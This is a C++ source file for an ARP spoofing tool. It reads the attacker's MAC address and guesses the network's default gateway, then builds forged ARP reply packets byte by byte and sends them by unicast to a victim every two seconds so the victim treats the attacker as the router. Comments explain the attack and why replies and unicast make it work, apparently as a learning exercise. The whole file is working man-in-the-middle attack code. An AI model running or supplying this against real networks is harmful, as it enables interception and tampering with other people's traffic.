#include "../headers/arp.h"

// Function to get the MAC address of the attacker's network interface
void ARP::get_mac_address(const char* iface, uint8_t* mac) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ);
    
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) == 0) {
        memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    } else {
        perror("Failed to get MAC address");
        exit(1);
    }

    close(fd);
}

void ARP::parse_mac(const char* mac_str, uint8_t* mac_out) {
    int values[6];
    if (sscanf(mac_str, "%x:%x:%x:%x:%x:%x", 
        &values[0], &values[1], &values[2], 
        &values[3], &values[4], &values[5]) == 6) {
        for(int i = 0; i < 6; ++i) mac_out[i] = (uint8_t)values[i];
    }
}

std::string ARP::get_default_gateway(const char* iface) {
    // 1. TRY STANDARD ROUTE TABLE (For Bridged/NAT with Internet)
    std::ifstream routeFile("/proc/net/route");
    if (routeFile.is_open()) {
        std::string line;
        std::getline(routeFile, line); // Skip header

        while (std::getline(routeFile, line)) {
            std::stringstream ss(line);
            std::string iface_name, dest, gateway;
            ss >> iface_name >> dest >> gateway;

            // Look for Default Gateway (Destination 00000000)
            if (iface_name == iface && dest == "00000000") {
                unsigned int ip_val;
                std::stringstream converter;
                converter << std::hex << gateway;
                converter >> ip_val;
                struct in_addr addr;
                addr.s_addr = ip_val;
                return std::string(inet_ntoa(addr));
            }
        }
        routeFile.close();
    }

    // 2. FALLBACK: HOST-ONLY MODE (No Internet Route)
    // If we are here, no default route exists. 
    // We assume the Gateway is the ".1" address of our subnet.
    
    // Get local IP address
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr;
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);

    if (ioctl(fd, SIOCGIFADDR, &ifr) == 0) {
        close(fd);
        struct sockaddr_in* ipaddr = (struct sockaddr_in*)&ifr.ifr_addr;
        std::string my_ip = inet_ntoa(ipaddr->sin_addr);

        // Logic: Convert "192.168.37.132" -> "192.168.37.1"
        size_t last_dot = my_ip.find_last_of('.');
        if (last_dot != std::string::npos) {
             std::string subnet = my_ip.substr(0, last_dot);
             std::string fallback_gw = subnet + ".1";
             // Optional: Print a debug tag so you know it was a guess
             // std::cout << " (Fallback)"; 
             return fallback_gw;
        }
    }
    close(fd);

    return "";
}

/*
    The Goal: Convince the Victim that We are the Router. 
    The Challenge: We must build a packet from scratch (Byte by Byte) 
    because the OS won't let us lie about our IP address using standard sockets.
*/

// Function to send an ARP spoofing packet
void ARP::send_arp_spoof(const char* iface, const char* target_ip, const char* spoof_ip, const char* target_mac_str) {
    // 1. Create Socket
    /*
        AF_PACKET: AF_INET starts at layer 3 (IP), AF_PACKET puts us at layer 2, thus letting us modify ARP structures.
        SOCK_RAW: Tell the OS to not touch our packets, so we'll format them manually.
        htons(ETH_P_ARP): Tell the kernel we will be working with ARP packets.
        htons - host to network short, intel cpus store numbers in little-endian format, network
        protocols expect big-endian format, this flips the bytes so network understands the number 2054 (0x0806 ARP ID)
    */
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) {
        perror("Socket creation failed");
        return;
    }

    // 2. Get Our MAC
    uint8_t attacker_mac[6];
    get_mac_address(iface, attacker_mac);

    // 3. Parse Victim MAC
    uint8_t victim_mac[6];
    parse_mac(target_mac_str, victim_mac);

    // 4. Prepare Packet
    uint8_t packet[60]; 
    memset(packet, 0, 60); // Set 60 bytes to 0 (to avoid garbage data)

    // Physical Envelope (14 bytes) + ARP Letter (28 bytes)
    struct ethhdr* eth = (struct ethhdr*)packet;
    
    // ARP Header starts after Ethernet Header
    struct arp_header* arp = (struct arp_header*)(packet + sizeof(struct ethhdr));

    // --- ETHERNET HEADER (The "Envelope") ---
    // h_dest: Destination MAC (Victim), instead of a broadcast
    // We use unicast to send private message and avoid the switch's filter
    memcpy(eth->h_dest, victim_mac, 6);   
    
    // h_proto: tell the receiving card that this is an ARP packet (not ipv4 or ipv6)
    memcpy(eth->h_source, attacker_mac, 6);
    eth->h_proto = htons(ETH_P_ARP);

    // --- ARP HEADER (The "Letter") ---
    arp->htype = htons(1);      // Ethernet
    arp->ptype = htons(0x0800); // IPv4
    arp->hlen = 6;
    arp->plen = 4;
    
    // The Opcode: 1 for Request, 2 for Reply
    // We chose 2: windows/linux cache logic says "If I got a reply, I must update my ARP table"
    // Simply sending Requests may be ignored.
    arp->oper = htons(2);       

    // sha: sender hardware address, our MAC
    memcpy(arp->sha, attacker_mac, 6);      
    // spa: sender protocol address, the IP we are spoofing (the Router's IP) 
    inet_pton(AF_INET, spoof_ip, arp->spa);  

    // In a Reply packet, we must specify exactly who we are talking to.
    memcpy(arp->tha, victim_mac, 6);         
    inet_pton(AF_INET, target_ip, arp->tpa); 

    // --- SOCKET ADDRESS ---
    sockaddr_ll device = {};
    device.sll_family = AF_PACKET;
    device.sll_protocol = htons(ETH_P_ARP);
    device.sll_ifindex = if_nametoindex(iface);
    device.sll_halen = ETH_ALEN;
    
    // Critical: Send physically to the Victim's MAC
    memcpy(device.sll_addr, victim_mac, 6); 

    // std::cout << "[+] Sending Unicast ARP Reply to " << target_mac_str << "..." << std::endl;

    this->attacking = true;
    while (this->attacking) {
        if (sendto(sock, packet, sizeof(packet), 0, (sockaddr*)&device, sizeof(device)) < 0) {
            perror("[-] Failed to send ARP packet");
        }
        // arpspoof typically sends every 2 seconds
        std::this_thread::sleep_for(std::chrono::seconds(2));
    }
    close(sock);
}